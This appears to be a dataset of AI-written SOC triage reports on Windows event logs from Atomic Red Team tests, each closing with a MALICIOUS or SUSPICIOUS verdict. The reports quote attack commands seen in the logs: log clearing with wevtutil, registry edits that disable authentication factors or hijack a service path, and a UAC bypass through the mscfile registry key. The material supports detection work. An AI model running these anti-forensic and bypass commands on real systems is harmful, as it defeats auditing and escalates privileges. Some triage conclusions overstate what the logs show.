   - Additionally, the system log shows similar events (Event ID 104) where logs for the system and Windows PowerShell channels were cleared by the same user ""admin_test"". This behavior is suspicious as clearing event logs is a known tactic used by attackers to cover their tracks.

2. **Time Manipulation:**
   - There are two security and system log events (Event ID 4616 and Event ID 1, respectively) associated with time changes on the system. The system time was set back by approximately two seconds, also involving the svchost.exe process. This activity might indicate an attempt to confuse log timelines, further obfuscating actions taken on the system.

3. **Suspicious Command-Line Execution:**
   - A command executed through `cmd.exe` to modify the registry (as noted in Sysmon Event ID 1) to disable the Windows search feature (`policies /v NoFind /t REG_DWORD /d 1 /f`) by the user ""admin_test"". This may indicate an attempt to hinder system usability or configuration changes as part of a malicious activity.

Overall, the combination of the log clearing, time manipulation, and unauthorized registry modifications strongly suggests potentially malicious activities. The consistency of the user ""admin_test"" being involved in these actions is also a significant indicator of potential internal compromise or misuse of credentials.

### Recommendation:
1. **Investigate User Activity:**
   - Immediately investigate the user account ""admin_test"" for unauthorized access or misuse. Check if the account is compromised and ensure that administrator accounts practice least privilege principles.

2. **Forensic Analysis:**
   - Conduct a thorough forensic analysis on ""Server002"" to identify any further malicious artifacts or changes on the system, e.g., unauthorized processes or network connections initiated by the server.

3. **Review Access Logs:**
   - Examine authentication logs for any unusual login patterns or logon attempts around the time of these events to detect unauthorized access.

4. **Update Security Policies:**
   - Strengthen event logging policies to alert on log clearance activities and unauthorized registry changes and restrict permissions for such actions.

### Final Assessment:
- **Resolution: MALICIOUS** - The logs contain several indicators of compromise, suggesting malicious activity is likely underway or attempted within the system. Immediate action is warranted to secure the affected environment."
InstallUtil HelpText method call,"Based on the provided logs, here is a detailed analysis:

1. **Security Log Analysis:**
   - **Event ID 1102**: The security log records an event indicating that the event logs have been cleared by the user ""admin_test"" (SID: S-1-5-21-3962163828-2803415714-1403596700-1006). Clearing event logs can be a suspicious activity, especially if done without proper justification, as it can be an attempt to cover tracks of malicious actions.
   
2. **Windows PowerShell Log Analysis:**
   - The PowerShell logs show that a script named `InstallUtilTestHarness.ps1` is being executed. It references a DLL file located in a temporary directory related to Atomic Red Team (T1218.004).
   - The Atomic Red Team library is widely used in security testing and emulation of attacker tactics. This suggests that the PowerShell script execution could be part of a penetration testing activity if authorized, or simulation, though the logs don't explicitly confirm the context.

3. **System Log Analysis:**
   - **Event ID 104**: The system log indicates that logs in System and Windows PowerShell channels were cleared around the same time as the security logs, by the same user ""admin_test"". Again, log clearance across multiple channels is suspicious and consistent with attempts to hide potentially malicious activities.

4. **Sysmon Log Analysis:**
   - Numerous Sysmon logs show the execution of `wevtutil.exe` commands to clear event logs (`/cl Microsoft-Windows-Sysmon/Operational`), which corresponds with the log clearance events noted above.
   - The PowerShell script appears to be executing tests related to the InstallUtil binary which, in conjunction with potential Atomic Red Team activities, can either point to security testing or potentially an advanced persistent threat actor using evasion techniques.

5. **Threat Assessment:**
   - The combination of cleared event logs and the use of tools associated with penetration testing or known evasion techniques suggests these logs could be part of a security test or malicious activity masquerading as such. 
   - Without additional context or supporting details identifying the activity as a sanctioned security test (e.g., an ongoing Red Team exercise), these indicators are certainly suspicious.

**Resolution: SUSPICIOUS**

- **Recommendation:**
  - Verify if this activity was part of an approved or scheduled security test. If not, it must be treated as a potential security incident, and an investigation should be initiated immediately.
  - Enhance monitoring around the user account ""admin_test"" and the host ""Server002"" for any further suspicious activities.
  - Implement measures to prevent unauthorized log clearance and analyze any other potentially impacted systems on the network."
AMSI Bypass - Override AMSI via COM,"Upon reviewing the provided logs, the following points of interest were identified:

1. **Clearing Event Logs:**
   - Several `wevtutil.exe` processes are executed with command lines indicating the clearing of various event logs (`Sysmon`, `Application`, `System`, `Security`, `Windows PowerShell`). The execution happened under a high integrity level by a user ""admin_test"".
   - This is corroborated by Event ID 104 in the System log and Event ID 1102 in the Security log, indicating the clearing of the logs with the `SubjectUserName` ""admin_test"".

2. **Execution of Suspicious Command:**
   - A `cmd.exe` process is executed with a command line adding a registry entry pointing to a non-existent DLL (`C:\IDontExist.dll`). This action is indicative of a potential persistence mechanism or attempt to load a malicious DLL.

3. **Time Skew Events:**
   - The System log indicates changes to the system time (Event ID 1 and 4616). Time manipulation can be a tactic to scrub evidence of malicious activity.

4. **Normal Microsoft Edge Update Activities:**
   - Multiple events related to `MicrosoftEdgeUpdate.exe` and related files in Edge Update directories are observed. These are standard update processes initiated by the Microsoft Edge update service.

### Assessment:

**SUSPICIOUS** 

The combination of log-clearing activities, suspicious registry modifications, and system time alteration suggests potentially malicious actions that require further investigation. Although the Microsoft Edge Update activities appear benign, the log-clearing and registry modifications indicate a misuse of administrative privileges, possibly to hide malicious actions.

### Recommendations:

1. **Immediate Investigation:**
   - Examine the context of user ""admin_test"" activities to verify if these actions were authorized.
   - Investigate the legitimacy and origin of the command injecting the non-existent DLL into the registry.

2. **System Monitoring:**
   - Increase monitoring on critical systems for further indications of persistence mechanisms or unauthorized access.

3. **User Training and Security Policy Review:**
   - Conduct awareness sessions for users with administrative privileges to prevent misuse.
   - Review and enforce security policies related to log management and process execution, especially for critical systems.

4. **Forensic Analysis:**
   - Further forensic analysis of the affected system to trace any additional indicators of compromise or other suspicious activities that might have been conducted before logs were cleared."
Compile After Delivery using csc.exe,"Upon analyzing the provided log entries, several indicators of potentially suspicious or malicious activity have been identified:

1. **Log Clearing Events:**
   - System log event ID 104 and Security log event ID 1102 indicate that logs were cleared by the user ""admin_test"". Log clearing is a common tactic used by malicious actors to cover their tracks.

2. **Wevtutil Usage:**
   - Multiple instances of `wevtutil.exe` are executed with the `cl` (clear) command on different log channels (e.g., System, Security, Windows PowerShell). This suggests deliberate log clearing activity.

3. **Privilege Escalation:**
   - Security log event ID 4672 records show the user ""admin_test"" had special privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others. These privileges are powerful and can be exploited by attackers to gain further control.

4. **Unusual Process Execution:**
   - The Sysmon log includes several process creation events connected to potentially suspicious activity:
     - Use of `cmd.exe` to compile a C# script (`calc.cs`) into an executable (`T1027.004.exe`) under a temporary directory often associated with testing or malicious payload development. T1027.004 is a reference to an ATT&CK technique for defense evasion – obscure/suspicious file execution.

5. **Network-Related Events:**
   - Security log events indicate a remote logon (LogonType 3) with NTLM authentication from IP `192.168.0.102` and IPv6 address `fe80::e3b5:5371:12a8:9c77`. While not inherently suspicious, it is relevant in the context of the other activities.

**Assessment:**
The combination of log clearing, usage of `wevtutil` to target logs, elevated privileges, and command-line activities related to potentially creating and possibly executing a new executable, all indicate suspicious behavior with possible malicious intent. While any single activity might be explainable under routine circumstances, the combination of these activities strongly suggests that this is not benign.

**Resolution: SUSPICIOUS**

**Guidance:**
- Investigate the actions of the user ""admin_test"" thoroughly. Verify if these activities were legitimate maintenance tasks or an indication of a compromised account.
- Perform forensic analysis on the system to check if any changes were made beyond log clearing, and identify the origin and purpose of the `T1027.004.exe`.
- Review access logs to determine any unusual patterns or connections, particularly related to the observed login from `192.168.0.102`.
- Evaluate the necessity of the privileges granted to ""admin_test"" and whether they've been misused. Consider reducing privileges if they are unwarranted.
- If malicious activity is confirmed, employ incident response procedures to contain and remediate the compromise."
Rundll32 with Ordinal Value,"Upon analyzing the provided Windows event logs, several points of interest raise concerns about potential malicious activity:

1. **Event Log Clearing:**
   - The logs show that multiple event logs were cleared by a user with the username ""admin_test."" Specifically, the Security, System, Windows PowerShell logs were cleared at around the same time (Events 1102 and 104). Clearing logs is a common tactic used by attackers to cover their tracks after conducting malicious activities.

2. **Use of Administrative Tools:**
   - The Sysmon log indicates the use of `wevtutil.exe` to ""cl"" (clear) event logs, which corroborates the event log clearing activities. This operation was executed under the same user context ""admin_test,"" suggesting intentional log manipulation.

3. **Suspicious Execution of Rundll32 and DLLs:**
   - There is a suspicious execution of `rundll32.exe` with a command line pointing to a DLL located in a user temp directory: `AllTheThingsx64.dll` (EventID 18018). The execution context includes a high integrity level and points to potentially unwanted or malicious DLL usage, particularly because it was run via `cmd.exe`.

4. **Excessive Privileged Logon Events:**
   - Several logon events with a high privilege level of `SeDebugPrivilege` and other similar privileges are associated with the user ""admin_test."" While not inherently malicious, their frequency and timestamp close to the clearing of logs add to the suspicious context.

5. **Windows PowerShell Activity:**
   - Although the detailed PowerShell logs were not included, the event log clearing of the Windows PowerShell log suggests possible PowerShell activity that might have warranted concealment, possibly tied to malicious commands or script execution.

### Assessment:
The combination of event log clearing, suspicious use of `rundll32.exe` with unknown DLLs, and high-privilege logons strongly suggest malicious activity rather than routine administrative tasks.

### Resolution:
**MALICIOUS**

### Guidance on How to Proceed:
1. **Containment:**
   - Isolate the affected system (Server002) from the network to prevent further potential malicious activity or data exfiltration.
 
2. **Investigation:**
   - Conduct a deeper forensic review. Analyze all available logs before the event clearing for further signs of compromise, including examining the specific DLL (`AllTheThingsx64.dll`) for its origin and purpose.
   - Review any network connections or data transfers initiated from this host around the time of the incident.

3. **Clean and Recover:**
   - Clean the system of any discovered malware or initiate a fresh system installation if the integrity is too compromised.
   - Review and reinforce current access and user permissions to prevent further unauthorized administrative actions.

4. **Preventive Measures:**
   - Implement stricter logging and alerting mechanisms for privileged activities, especially those involving toolsets capable of log manipulation (e.g., `wevtutil.exe`).
   - Educate users and admins on recognizing unauthorized privilege use and securing administrative credentials."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"Upon analyzing the provided Windows event logs, there are several points of interest that suggest potentially suspicious or malicious activity:

1. **Wevtutil Execution:** The presence of multiple instances of `wevtutil.exe` being executed to clear event logs (System, Security, and Application) is a typical indicator of an attempt to cover malicious activity. Event log clearing is commonly associated with unauthorized activity or an attempt to thwart forensic investigation.

2. **Use of Plink with CMD:** A concerning command-line invocation is noted with the execution of `cmd.exe` launching `plink.exe` to SSH to a remote host (`atomic.local`) without proper documentation or context. The use of default credentials (`root` with a password) listed in an external text file is particularly alarming and suggests a potential unauthorized data exfiltration or remote command execution.

3. **Clearing of Windows Logs:**
   - The Security log was cleared by the `admin_test` user, as evident from Event ID 1102 in the Security logs.
   - The System and Windows PowerShell logs were also cleared, as shown in the System logs by Event ID 104, indicating the same user `admin_test` carried out these actions.

4. **Potential Use of Atomic Red Team:** The use of directories like `AtomicRedTeam` and related execution of scripts linked to tests (potentially for cybersecurity assessments) could indicate the intentional execution of attacks or security test scenarios. However, the evidence does not suggest this was legitimately conducted for testing purposes, given the lack of logs and documentation supporting such activity.

5. **High Integrity Level and User Context:** Many suspicious actions were executed with high integrity level, and under an admin context, which suggests potential abuse of administrative privileges.

6. **Lack of Protective Auditing and Indicators of Privilege Escalation:** Several logs hint at privilege escalation, such as Event ID 4672 (Special privileges assigned to new logon), including sensitive privileges related to SeDebugPrivilege and SeTakeOwnershipPrivilege, which are often a red flag in environments where security is a concern.

Overall, the evidence of multiple log clearings combined with the suspicious use of `plink.exe` and the lack of a documented purpose for such actions strongly indicates potential malicious activity.

**Resolution: MALICIOUS**

### Next Steps:
- **Conduct a Full Investigation:** Deep-dive into the host to understand the full scope of the activities, ensuring that any compromised credentials are changed immediately.
  
- **Incident Response:** Initiate a formal incident response process, preserving evidence for further forensic analysis.
  
- **Mitigation Actions:** 
  - Disconnect potentially compromised systems from the network.
  - Increase monitoring for unusual network traffic associated with the systems involved.
  - Review and disable any accounts suspected of being compromised or used improperly.

- **Review Security Controls:** Implement stricter auditing for critical system actions and enhance alerting for suspicious behavior such as event log clearance.

- **Communication Plan:** Inform relevant stakeholders within the organization, including IT security teams and leadership, to ensure awareness and coordinated response efforts."
Service ImagePath Change with reg.exe,"After reviewing the provided Windows event logs, several indicators of suspicious behavior are observed:

### Key Findings:

1. **Log Clearing Activity:**
   - The security log shows Event ID 1102, indicating that logs were cleared by the account `admin_test`. Log clearing activities, especially on security logs, are often leveraged by attackers to cover their tracks.

2. **Usage of `wevtutil.exe` and Multiple Log Clear Commands:**
   - There are several instances of `wevtutil.exe` being executed with commands to clear logs like Sysmon, Security, Application, and Windows PowerShell. Specifically:
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""`
   - This pattern strongly indicates intentional log clearing, likely to obfuscate malicious activities.

3. **Suspicious Process Creation with `cmd.exe` and `reg.exe`:**
   - The execution of `cmd.exe` with a command to modify the registry under `HKLM\SYSTEM\CurrentControlSet\Services\calcservice`. The command specified modifies the `ImagePath` of `calcservice` to point to `cmd.exe`. This could be a technique used for persistence or privilege escalation by altering or creating malicious services.

### Assessment:
The combination of cleared logs, especially security-critical logs, and the suspicious registry modification command executed by `cmd.exe` with potential persistence or escalation intent forms a strong basis for identifying malicious behavior. These patterns are consistent with actions taken by threat actors to gain and maintain unauthorized access while attempting to conceal their tracks.

### Resolution:
- **MALICIOUS**: The logs conclusively show signs of malicious activity due to deliberate log clearing across multiple channels and suspicious registry alterations.

### Guidance:
1. **Containment and Remediation:**
   - Immediately isolate the affected host (Server002) from the network to prevent further potential compromise or data exfiltration.
   - Conduct a thorough forensic analysis of the host to determine the extent of the compromise and any possible lateral movement or secondary payloads.

2. **Audit and Review:**
   - Review user activity logs, especially for the `admin_test` account, to understand how credentials may have been compromised.
   - Conduct a full audit of all admin accounts and consider changing passwords or rotating credentials as necessary.

3. **Hardening and Monitoring:**
   - Implement stricter monitoring and alerts for critical events such as log clearing and registry modifications.
   - Increase the logging retention policy and ensure that backup logging solutions are resistant to such clear commands.

4. **Security Awareness:**
   - Train users on the importance of recognizing phishing attempts and securing account credentials to prevent similar compromises in the future.

Taking these steps will help strengthen your organization's security posture and prevent recurrence of such incidents."
Microsoft.Workflow.Compiler.exe Payload Execution,"Upon analysis of the provided logs, several points of interest stand out that indicate potential malicious activity or at least actions warranting further investigation:

1. **Log File Clearance**: 
   - The security log shows that the `admin_test` user cleared multiple event logs: System and Security (EventID 1102 in Security log and EventID 104 in System log). This action can hinder forensic analysis and is often an indicator of malicious intent attempting to cover tracks.

2. **PowerShell Activity**:
   - There are instances of PowerShell execution by the `admin_test` user. A PowerShell command references ""AtomicRedTeam"" which is known for emulating adversary tactics for testing defense mechanisms. The presence of such tests may suggest either legitimate penetration testing (if sanctioned and known to the team) or an unsanctioned activity indicative of a potential security incident.

3. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` is used to clear event logs. This utility was executed by the user `admin_test` precisely on the same timeframe when the logs were cleared, supporting the view of these actions as a potential cover-up.

4. **Unhandled Exception in Application Log**:
   - An unhandled exception caused by `microsoft.workflow.compiler.exe` resulting in a `System.IO.DirectoryNotFoundException`. While not directly malicious, the attempt to execute this might be associated with abnormal activity seen in conjunction with the clear-out of logs.

5. **Various Edge Update Executions**:
   - There are numerous instances of MicrosoftEdgeUpdate executions with varied command-line parameters by the SYSTEM account. Generally, these are legitimate processes, but the sheer volume and variety could warrant correlating if these coincide with any system administration tasks or scheduled updates.

Given these points, the resolution for this investigation is:

**SUSPICIOUS**

The findings suggest irregularities consistent with malicious actions: log clearing, PowerShell script associated with Atomic Red Team, and unexplained handling of exceptions. To proceed:

- Verify if the `admin_test` account activity aligns with expected behavior or documented tests.
- Investigate any approvals or schedules for the Atomic Red Team tests.
- Check for any administrative work orders, software updates that might explain the extensive MicrosoftEdgeUpdate activity.
- Further investigate the network traffic surrounding the times of these events.
- If determined unauthorized or unexplained by updates/testing schedules, consider this as a potential security incident and respond accordingly."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"Upon reviewing the provided event logs, several points and activities can be highlighted as noteworthy for a comprehensive analysis:

### Unusual Activities Noted:

1. **Clearing of Event Logs**:
   - Multiple logs, including System, Windows PowerShell, and Security logs, were cleared by the user ""admin_test"". The clearing of logs, especially security logs (`EventID 1102`), is often associated with malicious intentions to cover tracks.

2. **High-Integrity Commands and Processes**:
   - The usage of `wevtutil.exe` to clear logs (`EventID 1` in Sysmon) indicates log tampering activities initiated by the same user (admin_test) with high integrity access levels. 

3. **Suspicious Registry Manipulation**:
   - A command was executed via `cmd.exe` (noted in Sysmon logs) to modify the registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\SecondaryAuthenticationFactor"" /v ""AllowSecondaryAuthenticationDevice"" /t REG_DWORD /d 0 /f`. This can potentially suggest disabling certain security features.

4. **Time Change Events**:
   - Events in Security log (`EventID 4616`) show a time change event. Time changes can be used to revert system clocks to cover timelines of unauthorized activities.

### Potential Indicators of Compromise:
The combination of log clearing, high-privileged registry changes, and time adjustments could indicate attempts to hide malicious actions. Moreover, the combination of these events happening in close temporal proximity strengthens this suspicion.

### Threats or Risks Identified:
- **Log Tampering**: The clearing of security logs is a significant red flag in forensic investigations. Obfuscating audit trails indicates attempts to hide evidence.
- **Registry Changes**: Modifications to security policies via `reg.exe` without documentation or clear administrative intent often results in weakening system defenses.
- **Time Alterations**: The modification of system time might skew log timelines, making forensic analysis more difficult.

### Guidance and Recommended Actions:
1. **Immediate Incident Response**: Isolate the affected system to prevent any further potential compromise.
2. **Account Review and Revocation**: Review the activities of the user account ""admin_test"" and revoke privileges if unauthorized actions are confirmed.
3. **Forensic Analysis**: Deep dive into other sources such as network logs and endpoint monitoring to recover related events and activities that might not be evident from the system logs.
4. **Audit and Remediation**: Conduct a security audit across the environment to identify other potential vulnerabilities or signs of compromise and apply necessary security patches or configuration changes.

### Resolution: MALICIOUS
The activities described in the logs are consistent with attempts of system tampering and potential unauthorized access. The logs reflect indicators of activities likely intended to hide a compromise."
Rundll32 execute payload by calling RouteTheCall,"Upon reviewing the provided logs, there are several activities that appear suspicious and warrant further investigation:

1. **PowerShell Usage and Rundll32**:
   - The logs contain entries indicating the execution of `PowerShell` with a command utilizing `rundll32.exe` to indirectly call `calc.exe` through `zipfldr.dll`. 
   - This method of executing `calc.exe` is unconventional and often used to bypass detection as part of living-off-the-land attacks or malware evasion techniques.
   - Event IDs 600 in the PowerShell logs and events in the Sysmon logs showing the execution of `rundll32.exe` are key points of interest.

2. **Log File Clearance**:
   - The system logs (Event ID 104) and security logs (Event ID 1102) show that logs were cleared by a user `admin_test`. This can be an indication of an attempt to cover tracks following potentially malicious activity.
   - The use of `wevtutil.exe` to clear logs, as observed in the Sysmon logs, corroborates this behavior. It typically raises a red flag in forensic investigations.

3. **Privilege Levels and Execution Context**:
   - Processes like `wevtutil.exe`, `powershell.exe`, and their child processes are executed under an account with high integrity level and often associated with the `admin_test` user. This indicates elevated privileges, which can suggest malicious intent especially in conjunction with the clearing of logs.

4. **Unusual Process Activity**:
   - The execution pattern includes various command-line utilities like `whoami` and `hostname`, which can be employed in reconnaissance phases of an attack.
   - The invocation of `conhost.exe` multiple times, which wraps console applications, aligns with the sequence of executed commands and is notably tied to `wevtutil.exe` activities.

5. **Time Change Events**:
   - There are entries in the security logs regarding a time change (Event ID 4616), possibly indicating an attempt to disrupt log time-stamping or audit activities.
   
Given these considerations, the logs contain activities that exhibit potential signs of malicious behavior. Specifically, the indirect execution of `calc.exe` through `rundll32.exe` and the clearing of the event logs are actions consistent with an adversary's attempt to obfuscate activity on the host.

### Conclusion: SUSPICIOUS

**Actionable Recommendations**:
- **Immediate Investigation**: Conduct a thorough investigation into the `admin_test` user activities and authorization levels.
- **Host Review**: Perform an integrity check on `zipfldr.dll`, `wevtutil.exe`, `rundll32.exe`, and all related binaries to ensure they haven't been tampered with.
- **Log Restoration**: Attempt to recover the cleared logs using log recovery techniques or backup systems.
- **Strengthen Monitoring**: Increase monitoring on the affected host for further anomalous activities, focusing on command execution trails.

These steps should help determine if there was a sustained breach and protect against potential follow-up actions by the threat actor."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"Upon reviewing the provided Windows event logs, several points of interest stand out, suggesting potential malicious activity or activity that warrants further investigation:

1. **Event Log Clearing**: 
   - Several log entries (Event IDs: 104 and 1102) indicate that logs in various channels (System, Windows PowerShell, and Security) have been cleared by the user `admin_test`. Clearing of logs is a common tactic used by attackers to cover their tracks and can indicate malicious activity.

2. **Registry Modification**:
   - There is a log entry (Event ID: 1, Sysmon) showing a command execution that modifies the registry key `HKLM\System\CurrentControlSet\Control\Terminal Server` to alter the `fSingleSessionPerUser` setting. This change potentially allows multiple remote sessions for a single user account, which might be used for unauthorized remote access.

3. **Time Manipulation**:
   - Time changes are recorded in the logs (Event ID: 4616, Security). The event indicates that the system time was altered, which could be a technique used to fool time-based defenses or to obscure other log entries by desynchronizing timestamps.

4. **Use of wevtutil.exe**:
   - The `wevtutil.exe` utility is invoked multiple times in the logs. While `wevtutil` is a legitimate tool used to manage Windows Event logs, its frequent invocation, especially by an admin user and in conjunction with event log clearing, raises suspicion.

5. **Unusual Command Execution**:
   - Several executions of command-line utilities (e.g., `whoami.exe`, `hostname.exe`, `cmd.exe`, `reg.exe`) are observed. These utilities are legitimate, but in the context of cleared logs and other changes, they could signify reconnaissance efforts.

6. **Privilege Escalation or Lateral Movement Preparation**:
   - The privileges listed in one of the events (Event ID: 4672, Security) show high-level privileges including `SeSecurityPrivilege`, `SeBackupPrivilege`, and `SeDebugPrivilege`, which could facilitate privilege escalation or lateral movement.

**Assessment**: Based on the analysis, the behavior described in the logs is highly suspicious. The combination of log clearing, system manipulation, and potential security bypass actions aligns with activities typically seen in system compromises.

**Resolution**: **SUSPICIOUS**

**Guidance**:

- Review and assess the user account's activity logs further to determine if actions taken by `admin_test` were authorized and necessary for the functioning of the server.
- Evaluate the system for signs of unauthorized access, including running security scans for malware or other signs of intrusion.
- Implement monitoring and alerting for any further use of similar commands and access patterns, and consider more restrictive access permissions for sensitive accounts."
CheckIfInstallable method call,"After a detailed analysis of the provided Windows event logs, the following key observations stand out:

1. **Clearing of Event Logs**: The security event log records Event ID 1102, indicating the event log was cleared by the user `admin_test`. Similarly, the System log shows Event ID 104 indicating the clearing of the ""System"" and ""Windows PowerShell"" logs. Clearing event logs is a common tactic used by attackers to cover their tracks after performing malicious activities. This action alone is highly suspicious.

2. **Wevtutil Usage**: There are several instances of the `wevtutil.exe` command being used to clear various logs (security, application, and system). The command line arguments and context (same user `admin_test`, within a brief timeframe) suggest that these actions were intentional and orchestrated, likely to remove traces of potential malicious activities.

3. **PowerShell Activity**: There is evidence of PowerShell activities (e.g., using scripts located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam`) indicative of a possible execution of techniques defined in the Atomic Red Team framework, which is used for testing security controls. While this can be benign in an environment where security testing is expected, combined with the events log clearing, the context raises red flags.

4. **Execution of Potentially Malicious Scripts**: The PowerShell log records an execution that involved the script `InstallUtilTestHarness.ps1`. These scripts and their paths align with known test scripts used to simulate Tactics, Techniques, and Procedures (TTPs) for adversary emulation.

5. **Persistent High Integrity Sessions**: Multiple processes, initiated by the user `admin_test` with high integrity, suggest access to elevated privileges. Such processes should typically be limited or controlled strictly.

6. **Anomalous NET and CSC Behaviors**: Execution of `csc.exe` and `cvtres.exe` under temporary directories could indicate attempts at compiling or modifying code, which might be part of the activity to either execute benign or malicious payloads, but within the context of the other logs here, it remains suspicious.

**Assessment**:
- The logs feature multiple suspicious activities centered on the clearing of security, system, and PowerShell event logs, and the usage of administrative tools like `wevtutil` in conjunction with likely adversarial emulation scripts or tests executed via PowerShell.
- The timing and flow of events strongly suggest attempts to cover up actions deemed sensitive or malicious.

**Conclusion:**
- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Security Measures**: Isolate the affected host to prevent any potential spread of malicious activities.
2. **Forensic Analysis**: Conduct a thorough forensic analysis to identify any malicious payloads, unauthorized accesses, and assess any possible data exfiltration.

UACME Bypass Method 61,"Upon detailed analysis of the provided Windows event logs, several indicators suggest potentially suspicious behavior, namely:

1. **Log File Clearing:** 
   - Multiple logs indicate that log files were cleared, which can be a sign of log manipulation typical in attempts to cover tracks after performing unauthorized or malicious activity. Specifically:
     - System log (EventID 104) shows that both System and Windows PowerShell logs were cleared by the user `admin_test`.
     - Security log (EventID 1102) shows that the Security log itself was cleared by `admin_test`.

2. **Unusual Command Line Execution:**
   - A process associated with `cmd.exe` executed with a peculiar command line that attempts to reference and possibly execute a file at `..\\ExternalPayloads\\uacme\\61 Akagi64.exe`. The particular component `uacme` is known to be exploited for User Account Control (UAC) bypass, which is a potential indicator of privilege escalation attempts.

3. **Use of `wevtutil.exe`:**
   - The command `wevtutil cl` was executed multiple times in quick succession to clear various logs (Sysmon, Application, and Security), which aligns with the log-clearing observations.

4. **Execution of Processes with High Integrity Level:**
   - Numerous processes such as `cmd.exe` and `wevtutil.exe` running with a High Integrity Level suggest elevated privileges potentially obtained through illicit means.

5. **Presence of Atomic Red Team Artifacts:**
   - The directories and naming convention (`AtomicRedTeam`) strongly suggest that adversary simulation or post-compromise scenarios were being executed, typically seen in penetration testing or red team activities, albeit not stratified here.

### Conclusions:

Given these logs' patterns—especially the clearing of important logs, execution of potentially compromising commands aimed toward privilege escalation and anti-forensics—there are strong indicators suggesting malicious activities. The execution of `uacme` tool paths and the specific naming within temporary directories further support these are crafted actions for bypass and escalation testing, possibly without the consent of appropriate change management or defensive teams.

### Resolution: MALICIOUS

### Recommendations:

1. **Immediate Response:**
   - Isolate the affected system (`Server002`) from the network to prevent any potential lateral movement.
   - Perform a forensic investigation on the system to determine the full scope of the compromise.

2. **Audit and Review:**
   - Review security policies and access logs to determine if the user `admin_test` is authorized for these activities or if credentials have been compromised.
   - Investigate if similar activities have occurred elsewhere within the network.

3. **Enhance Monitoring:**
   - Implement stricter log retention and monitoring policies to detect and prevent unauthorized clearing or tampering with event logs.
   - Deploy enhanced endpoint detection and response (EDR) solutions to provide better visibility into such activities.

4. **User Awareness and Training:**
   - Provide security awareness training for administrative and privileged users to recognize the signs of account compromise and the importance of adhering to changes and process execution protocols. 

These actions will aid in restoring security post-compromise and help in mitigating future risks."
Execute base64-encoded PowerShell from Windows Registry,"Upon reviewing the log entries provided, let's analyze each type of log and its significance in indicating potential malicious activity:

### Windows PowerShell Logs
- **Encoded PowerShell Commands**: The logs show PowerShell commands being executed with Base64 encoding and using `IEX` to execute them. This technique is commonly associated with obfuscation to hide malicious commands from detection. Storing and retrieving commands from the registry further suggests an attempt to evade detection.
- **Repetitive Execution**: Multiple PowerShell related log entries indicate consistent usage of potentially encoded and executed content which is suspicious.

### Application Logs
- **Windows Defender Active**: The consistent logs indicate Windows Defender is in an active state. This provides some assurance that antivirus measures are at least running. However, they are not specifically indicative of defending against the PowerShell activity noted.

### Sysmon Logs
- **Process Creation**: There are several process creation logs, including whoami, wevtutil, and PowerShell.exe. The repeated clearing of event logs (Microsoft-Windows-Eventlog ID 104) through the use of wevtutil suggests an attempt to hide footprints. The use of whoami and hostname could indicate reconnaissance activities by someone attempting to discover user and system details.
- **Process Hierarchy**: The parent process being wsmprovhost.exe for various command line utilities suggests a script or remote execution service is being used to perform these tasks.

### System Logs
- **Log File Clearing**: The events indicating system and PowerShell logs have been cleared by a user account ('admin_test') suggests intentions to cover tracks after potential unauthorized activities - a common tactic used in post-exploitation scenarios.

### Security Logs
- **Admin Login and Privilege**: The logs show logon attempts and the assignment of high-level privileges. Combined with the timestamp matching the execution of PowerShell commands, this suggests potential unauthorized logins or privilege escalations.

### Conclusion
The combination of Base64 encoded PowerShell commands, repeated log file clearing activities, and evidence of privilege escalation all raise significant red flags. These indicators collectively suggest that the system is undergoing a series of potentially malicious activities designed to obfuscate, execute unauthorized commands, and remove traces.

### Resolution
- **MALICIOUS**: The logs contain evidence suggestive of active threats and malicious activity, confirmed by encoded PowerShell execution, log clearing, and command-line tool usage for footprint concealment.

### Recommendations
- **Immediate Isolation**: The host should be isolated from the network to prevent further spread of possible malicious actions.
- **Thorough Investigation**: Conduct a detailed forensic analysis to understand the extent and nature of the execution, possible data exfiltration, and compromised accounts.
- **Review and Harden Security Policies**: Implement stricter logging policies, monitor remote execution permissions, and apply strict PowerShell execution policies.
- **Incident Response**: Engage the incident response team to address potential ongoing threats and plan recovery and preventive actions."
Bypass UAC using Event Viewer (PowerShell),"## Detailed Analysis

### Suspicious or Anomalous Behavior

1. **Event Log Clearing**: 
   - **Sysmon Logs**: The use of `wevtutil.exe` by the user `admin_test` to clear event logs is apparent. This activity is recorded multiple times (Event IDs: 17948, 17952, 17960, and 17964) where the command lines were specifically used to clear different logs such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell`. 
   - **Security Log (Event ID 1102)**: This is correlated with `wevtutil.exe` process activity, indicating that the logs were cleared by the same user (`admin_test`), which is consistent with trying to cover tracks.
   
2. **PowerShell Execution**:
   - **Sysmon and Windows PowerShell Logs**: There is a suspicious use of PowerShell to modify registry settings and attempt privilege escalation via registry tampering. The command modifies the registry path `HKCU:\software\classes\mscfile\shell\open\command` to execute `cmd.exe` and then starts `eventvwr.msc`. This can be an indicator of a User Account Control (UAC) bypass method known to integrate with other malicious activities.
   
3. **Time Manipulation**:
    - **System Log (Kernel General and Time Service)**: There were events indicating potential time manipulation, potentially to alter log timestamps or to ensure certain activities occur unnoticed, notably resetting time backward. The involvement of the `svchost.exe` process raises red flags in this context since it manages many critical Windows services.

### Indicators of Malicious Activity

The activities mentioned above culminate in strong indicators of malicious behavior:
- **Clearance of logs using `wevtutil.exe`** and entries indicating the associated security events show an attempt to mask activities on the system.
- **Registry modifications via PowerShell** are a known tactic for privilege escalation or to bypass security mechanisms such as UAC.
- **Potential time manipulation** might link activities to obscure or obfuscate real-time incidents.

### Security Threats and Risks Identified

- **Data Integrity Risk**: Clearing logs and time manipulation threaten the integrity of incident detection and audit capabilities.
- **Elevation of Privilege Risk**: PowerShell usage for registry manipulation indicates attempts at unauthorized privilege elevation.
